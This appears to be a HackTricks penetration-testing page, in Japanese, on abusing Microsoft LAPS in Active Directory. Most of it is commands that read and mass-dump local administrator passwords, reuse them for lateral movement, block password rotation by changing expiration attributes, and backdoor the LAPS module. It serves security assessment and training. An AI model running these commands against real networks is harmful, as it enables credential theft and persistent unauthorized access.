# LAPS

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

現在、assessment 中に遭遇する可能性がある **LAPS flavours** は **2 種類**あります。

- **Legacy Microsoft LAPS**: ローカル administrator password を **`ms-Mcs-AdmPwd`** に、expiration time を **`ms-Mcs-AdmPwdExpirationTime`** に保存します。
- **Windows LAPS**（April 2023 updates 以降 Windows に組み込み）: legacy mode を引き続きエミュレートできますが、native mode では **`msLAPS-*`** attributes を使用し、**password encryption**、**password history**、および domain controllers 用の **DSRM password backup** をサポートします。

LAPS は **local administrator passwords** を管理するために設計されており、domain-joined computers 上でそれらを **unique、randomized、かつ頻繁に変更**します。これらの attributes を読み取れる場合、通常は対象 host へ **local admin として pivot**できます。多くの環境で重要なのは、password 自体を読み取ることだけでなく、password attributes への access を **誰に delegation されているか**を見つけることです。

### Legacy Microsoft LAPS attributes

domain の computer objects では、Legacy Microsoft LAPS の実装により、2 つの attributes が追加されます:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS は、computer objects に複数の新しい attributes を追加します:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: encryption が有効でない場合に JSON として保存される clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers 用の encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: newer rollback-detection logic（Windows Server 2025 forest schema）で使用される GUID-based version tracking

**`msLAPS-Password`** を読み取れる場合、その value は account name、update time、clear-text password を含む JSON object です。例:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 有効化されているか確認
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **raw LAPS policy** を**ダウンロード**し、[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package の **`Parse-PolFile`** を使用して、このファイルを人間が読みやすい形式に変換できます。

### Legacy Microsoft LAPS PowerShell cmdlets

Legacy LAPS module がインストールされている場合、通常は以下の cmdlets を利用できます。
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS には、新しい PowerShell module と新しい cmdlets が含まれています:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
ここでは、いくつかの運用上の詳細が重要です:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** は **legacy LAPS**、**clear-text Windows LAPS**、**encrypted Windows LAPS** を自動的に処理します。
- パスワードが暗号化されており、**read** はできても **decrypt** できない場合、cmdlet は clear-text パスワードを返せなくても、**`Source`**、**`DecryptionStatus`**、**`AuthorizedDecryptor`** などのメタデータを返します。
- **encrypted Windows LAPS** では、**read permission** と **decrypt permission** は**異なる制御**です。OU / object の read access があっても、**`msLAPS-EncryptedPassword`** を自動的に decrypt できるわけではありません。
- **Password history** は、**Windows LAPS encryption** が有効な場合にのみ利用できます。
- domain controllers では、返される source が **`EncryptedDSRMPassword`** になる場合があります。

これは assessment 中に役立ちます。**`AuthorizedDecryptor`** フィールドから、その blob が**どの user または group 向けに暗号化されたか**が分かるため、失敗した password read が、新たな privilege-escalation target につながることがよくあります。

### PowerView / LDAP

**PowerView** を使用して、**誰が password を read できるかを確認し、実際に read する**こともできます:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
**`msLAPS-Password`** が読み取り可能な場合は、返された JSON を解析し、パスワードとして **`p`** を、管理対象のローカル admin アカウント名として **`n`** を抽出します。
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
その **`n`** フィールドは、より新しい deployment で重要です。これは **Windows LAPS automatic account management** が組み込みの **`Administrator`** ではなく **custom account** を対象にできるためです。また、より新しい **Windows 11 24H2 / Windows Server 2025** システムでは、そのアカウント名を **randomize** することさえできます。<sup>[[4]](#references)</sup>

### Linux / リモートツール

Modern tooling は、legacy Microsoft LAPS と Windows LAPS の両方をサポートしています。
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** は Linux から **legacy Microsoft LAPS** を扱う場合に依然として有用ですが、対象は **`ms-Mcs-AdmPwd`** のみです。
- **`LAPS4LINUX`**、**`dpapi-ng`** ベースのツール、最近の **NetExec** workflows など、より新しい cross-platform tooling は、non-Windows hosts から **native Windows LAPS** も扱えます。
- 環境で **encrypted Windows LAPS** が使用されている場合、単純な LDAP read だけでは不十分です。**authorized decryptor**（または offline domain DPAPI-NG root key material など、同等の decryption material）である必要もあります。<sup>[[5]](#references)</sup>
- **Windows 11 24H2 / Windows Server 2025** では、managed local admin が常に **`Administrator`** であるとは限らないため、そう決めつけないでください。Automatic account management は custom account を作成し、その名前をランダム化することもできます。そのため、大規模に **`--laps`** を使用する前に、まず **`n`** / **`Account`** で account name を確認してください。<sup>[[4]](#references)</sup>

### Directory synchronization abuse

各 computer object への直接の read access ではなく、domain-level の **directory synchronization** rights を持っている場合でも、LAPS は依然として興味深い対象になり得ます。

**`DS-Replication-Get-Changes`** と **`DS-Replication-Get-Changes-In-Filtered-Set`** または **`DS-Replication-Get-Changes-All`** の組み合わせを使用すると、legacy **`ms-Mcs-AdmPwd`** などの **confidential / RODC-filtered** attributes を synchronize できます。BloodHound ではこれが **`SyncLAPSPassword`** として model 化されています。replication-rights の背景については [DCSync](dcsync.md) を確認してください。

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) は、複数の functions による LAPS の enumeration を容易にします。<sup>[[6]](#references)</sup>\
その 1 つは、**LAPS enabled のすべての computers** に対する **`ExtendedRights`** の parsing です。これにより、**LAPS passwords の read を委任された** **groups**、特に protected groups に所属する users が表示されます。\
**computer を domain に join した** **account** は、その host に対する `All Extended Rights` を受け取ります。この right により、その **account** は **passwords を read** できるようになります。Enumeration によって、ある host 上の LAPS password を read できる user account が見つかることがあります。これは、LAPS passwords を read できる **specific AD users** を **target** する際に役立ちます。
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec を使用した LAPS パスワードのダンプ

インタラクティブな PowerShell がない場合、この権限を LDAP 経由でリモートから悪用できます：
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
これは、ユーザーが読み取り可能なすべてのLAPS secretsをdumpし、別のlocal administrator passwordでlateral movementを行えるようにします。

## LAPS Passwordの使用
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### 有効期限

admin になると、**パスワードを取得**し、**有効期限を未来の日付に設定**することで、マシンが**パスワードを更新**しないようにすることが可能です。

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS では、代わりに **`msLAPS-PasswordExpirationTime`** を使用します。
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** を **admin** が使用した場合、または **Do not allow password expiration time longer than required by policy** が有効な場合も、password は rotate されます。

### 新しい Windows LAPS における snapshot rollback の注意点

古い snapshot / image rollback の手法は、最近の **Windows LAPS** の deployment に対しては**信頼性が低くなっています**。**Windows 11 24H2 / Windows Server 2025** では、forest schema に **`msLAPS-CurrentPasswordVersion`**（**Windows Server 2025 forest schema**）が含まれている場合、client はローカルに cache された GUID と AD に保存された値を比較し、rollback によって **torn state** が作成されると、**直ちに password を rotate** します。

実際には、これは snapshot ベースの persistence や、以前に判明した local admin password を復活させようとする試みが、次の通常の expiration まで存続するのではなく、すぐに無効化される可能性があることを意味します。<sup>[[2]](#references)</sup>

この保護は **AD-backed Windows LAPS** にのみ適用され、revert された machine が **AD に対して authenticate** できることにも依存します。machine が AD と通信できなくなった場合でも、**password history** または **AD backup access** が状況を救う可能性があります。

### Automatic account management の tamper に関する注意点

**automatic account management** が有効な場合、Windows LAPS は管理対象の local admin account の lifecycle を管理します。その account の予期しない rename、reconfigure、その他の tamper は **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** によって拒否される可能性があるため、管理対象の LAPS account を密かに変更することに依存した persistence は、最近の endpoint では信頼性が低くなっています。<sup>[[4]](#references)</sup>

### AD backup から historical password を復元する

**Windows LAPS encryption + password history** が有効な場合、mount された AD backup が追加の secret source になる可能性があります。mount された AD snapshot にアクセスし、**recovery mode** を使用できれば、live DC と通信せずに、以前に保存された password を query できます。<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
これは主に **AD backup theft**、**offline forensics abuse**、または **disaster-recovery media access** の際に関連します。

### Backdoor

legacy Microsoft LAPS のオリジナル source code は[こちら](https://github.com/GreyCorbel/admpwd)にあるため、code 内（例えば `Main/AdmPwd.PS/Main.cs` の `Get-AdmPwdPassword` method 内）に backdoor を仕込み、何らかの方法で **新しい password を exfiltrate したり、どこかに保存したり**することが可能です。

その後、新しい `AdmPwd.PS.dll` を compile し、`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` に upload します（併せて modification time も変更します）。

## References

- [1] [Microsoft LAPS の紹介 - Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows Server Active Directory 向け Windows LAPS schema および rights extensions](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Windows Server Active Directory で Windows LAPS を使い始める](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
